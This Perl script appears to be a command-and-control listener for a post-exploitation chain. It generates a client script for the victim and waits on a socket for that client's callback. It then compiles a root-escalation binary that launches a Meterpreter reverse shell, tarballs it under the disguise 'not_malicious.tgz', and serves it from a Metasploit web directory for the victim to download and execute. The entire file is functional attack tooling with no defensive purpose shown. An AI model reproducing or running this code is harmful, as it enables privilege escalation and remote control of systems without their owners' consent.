#!/usr/bin/perl

$| =1;
use strict;
use IO::Socket::INET;
# given a path to a binary rip the necessary 32-bit aligned shellcode to PUSH path onto stack in preparation for execution

# BEGIN CONFIGURATION

my $RootDir = "/home/debian/test/";
my $WebDir  = "/opt/metasploit-4.3.0/apps/pro/ui/public/";          # just use MSF nginx server :-)


my %Globals = (                    # random things that multiple routines need to function eg formatting strings etc
    
    "Cformat" => "\\x%x",          # format for C representation of a byte
    "PUSH" => 0x68,		   # distinguish from 0x68 as ascii 'h'
				   
    );

my %VictimParams = (               # configuration for files AS THEY APPEAR ON TARGET

    "ExePath" => "",               # parent directory ON TARGET to execute elevator,path w/o name of binary will be obtained during initial exploit
				   # NOTE: the binary name itself will be inserted later so don't put it here!

    "PayloadPath" => "",              # final absolute path to elevation bianry on target
  				  
    );


my %AttackCommands = (    
    "tar" => "tar czvf %s %s",
    "gcc" => "gcc -m32 -march=pentiumpro -o %s %s",
    );


my %AttackerParams = (                # configuration for files AS THEY ON ATTACK HOST

		   # parameters for configuring the template client script. This client script once filled out and renamed will be uploaded and executed automatically and will send back information to attacker listener script which will configure binary in response to enviornmental parameters on target

		   "TemplatePath"      => "$RootDir/ClientTemplate.pl", # location for template Perl script that will be uploaded and executed to retrieve elevation + payload tarball
		   "OutputPath"        => "$WebDir/Nothing.txt",                    # ClientTemplate.pl filled out renamed and placed where it can be retrieved automatically by exploit
		   "ParameterLoc"      => "__CLIENT_PARAMETERS__",                              # placeholder in ClientTemplate.pl for dynamically generated parameters (should never need to change this)

		   # parameters for preparing the source to compile to the correct elevation binary 

                   "FullPayloadPath" =>  '',                                                         # This is what gets inserted into the source .c elevation binary.  like victim->{FullPayloadPath} but it might be formatted differently so a separate copy is neded. 
	    #      "PathTransformer"   => \&ShellcodFromPath        # perhaps the elevation code you're working with requires C-string shellcode
                   "PathTransformer"   => \&ASCII_Path,             # but if you're working with an ascii path like execl() just the full path please :)

		   "ElevateSource"    => "$RootDir/test_template.c",    # full path to template source used to rip elevation binary
		   "PathPlaceHolder"  => "__PAYLOAD_PATH__",                                     # string to replace in template with formatted shellcode containing full path to MSF payload to execute as root
		   "TmpSource"        => "$RootDir/temp.c",                                # name for temporary source code w/ payload path filled out

		   # binaries will be in a directory which will be tarballed and sent to target
				   
		   "TarDir"           => "tarball/",# parent directory of unpacked files              
		   "ElevatorName"     => "elevate",              # name for elevation binary under TarDir
		   "MSF_Payload"      => "reverse_met",          # name for meterpreter shell under TarDir

                   "TarName"          => "not_malicious.tgz",    # name of output tarball
		   "XferDir"          => "$WebDir", # location to drop output tarball
		   "TarURI"           => "",                      # relative (to wwwroot) path to output tarball [filled in automatically]

                   # network parameters 
		   "Server"           => "10.10.0.2",
		   "PerlPort"         => 1234,                   # socket to listen to communicated with uploaded script	  
		   "WebPort"          => 3790,                     # port of webservice hosting malicious tarball 
                   "WebOptions"       => "--no-check-certificate",  # any random flags that need to be passed to wget or whatever

		   "command"         => \%AttackCommands,                                      
				      
	     

   );


my %ServerConfig = 
    (
     "victim" => \%VictimParams,
     "attacker" => \%AttackerParams,
     "var"   => \%Globals,
    );



PrepareToElevate(\%ServerConfig);

# BEGIN CODE

sub PrepareToElevate
{
    my $conf = shift;
    
    my $victim = $conf->{victim};
    my $attacker = $conf->{attacker};

    # prepare a perl script that can be uploaded/executed to communicate back to C2 Server

    my @ClientCommands = ( # options from %AttackParams that need to be copied into new client script
	"TarName",
	"TarDir",
	"Server",
	"WebPort",
	"WebOptions",
	"PerlPort",
        "ElevatorName",
	"MSF_Payload",
	);
    
    $conf->{ClientCommandList} = \@ClientCommands;

    BuildClientScript($conf);

    # begin listening for a connection

    my $socket = new IO::Socket::INET(
	LocalHost => $attacker->{Server},
	LocalPort => $attacker->{PerlPort},
	Listen => 1,
	Reuse => 1,
	) or die "Connection error $!\n";
    
    printf ("Listening on %s:%s...\n",$attacker->{Server},$attacker->{PerlPort});

    my $new_sock = $socket->accept();
    printf "Initiated connection...\n";


    while (<$new_sock>) 
    {
	if ($_) {printf("received $_\n");}

	if ((my $victim_pwd) = $_ =~ /^PWD\:(.*?$)/s)
	{
	    printf ("received remote system path \"%s\". Commencing elevation.\n",$victim_pwd);
	    $victim->{InitialDirectory} = $victim_pwd."/";

	    # build elevation binary w/ meterpreter shell and deliver to the web server

	    PrepareElevationPackage($conf);
	    
	    # notify client that package is ready for pickup and execution

	    $new_sock->send(sprintf("GET:%s\n",$attacker->{TarURI}));
	}
    }
}

sub PrepareElevationPackage
{
    my $conf = shift;
    
    my $victim = $conf->{victim};
    my $attacker = $conf->{attacker};


    # build full path to meterpreter payload

    $victim->{FullPayloadPath} = $victim->{InitialDirectory}.$attacker->{TarDir}.$attacker->{MSF_Payload};
    
    # pack path to meterpreter payload into shellcode to be executed by elevation exploit

    $attacker->{FullPayloadPath} = &{$attacker->{PathTransformer}}($conf);

    UpdateSource($attacker);
    RipBinary($attacker); 
    WrapTarball($attacker);

}

sub RipBinary
{
    
    my $attack = shift;
    my $com = $attack->{command};

    sys_exec($com->{gcc},
	     $attack->{TarDir}.$attack->{ElevatorName},
	     $attack->{TmpSource});

	 
}

sub WrapTarball
{
    my $attacker = shift;
    
    my $com = $attacker->{command};

    sys_exec($com->{tar},
	     $attacker->{XferDir}.$attacker->{TarName},
	     $attacker->{TarDir},
	);

    $attacker->{TarURI} = "/".$attacker->{TarName};
    printf("Tarball accessible at http://%s:%s/%s\n",$attacker->{Server},$attacker->{WebPort},$attacker->{TarURI});
}

# Path transformers

sub ASCII_Path
{
    my $conf = shift;

    return $conf->{victim}->{FullPayloadPath};

}

sub ShellcodeFromPath # format shellcode into correctly order series of 5-byte statements "\x64"[PUSH]+4 bytes of ASCII with the path
{
    my $conf = shift;

    my $path = $conf->{victim}->{FullPayloadPath};
    my $globals = $conf->{var};

    my $pad = '/';   # cuz Unix accepts any number of these bad boys :D
    my @PathName;
    my $PUSH = 0x68;          # to distinguish from when 0x68 is ascii 'h'
    my $pathLen = length($path);

    printf("Packing \"%s\" to be executed on target: \n",$path);
    my $padLen = $pathLen % 4;  # number of extra '/' needed to force alignment

    if ($padLen != 0) {
	$padLen = (4-$padLen)+1;
	$pad = '/'x($padLen);
	$path =~ s/^\/(.*$)/$pad\1/;
    }

    (my @quarters) = $path =~ /(.{1,4})/g;

    while (my $quart = pop @quarters)
    {
	my $shellcode = sprintf($globals->{Cformat},$globals->{PUSH});
	$shellcode .= StringToC_Hex($quart,$globals);
	$shellcode = sprintf("\"%s\"\n",$shellcode);
	push @PathName,$shellcode;
    }

    my $Packed = join('',@PathName);
    printf("$Packed\n");

    return join('',@PathName);
}

sub StringToC_Hex
{
    (my $string,
     my $global) = @_;


    my $Cstring;

    foreach my $char (split('',$string))
    {
	$Cstring .= sprintf($global->{Cformat},ord($char));
    }
    return $Cstring;

}

sub readfile
{
    my $file = shift;
    my $buffer;

    open FILE,"$file" or die "could not open $file!\n";

    while (<FILE>)
    {
	$buffer .= $_;
    }
    return \$buffer;
}

sub writefile
{
    (my $target,
     my $data) = @_;

    open FILE,">","$target" or die "could not open $target!\n";
    print FILE $$data;
    close FILE;
}

sub sys_exec
{
    my $command_string = shift;
    my $Command = sprintf($command_string,@_);
    printf("\nExecuting: %s\n",$Command);
    system(sprintf($Command));

}

sub UpdateSource
{
    my $attack = shift;
    my $Source = readfile($attack->{ElevateSource});    
    $$Source =~ s/$attack->{PathPlaceHolder}/$attack->{FullPayloadPath}/s;
    printf("Updating %s...\n",$attack->{TmpSource});
    writefile($attack->{TmpSource},$Source);
}


sub BuildClientScript
{
    my $conf = shift;
    my $attack = $conf->{attacker};
    my $Template = readfile($attack->{TemplatePath});

    my $HashRow = "\t'%s' => '%s',\n";
    my $HashList = '';

    foreach my $key (@{$conf->{ClientCommandList}})
    {
	$HashList .= sprintf($HashRow,$key,$attack->{$key});
    }

    $$Template =~ s/$attack->{ParameterLoc}/$HashList/s;

    printf("Writing client script to %s...\n",$attack->{OutputPath});
    writefile($attack->{OutputPath},$Template);
}
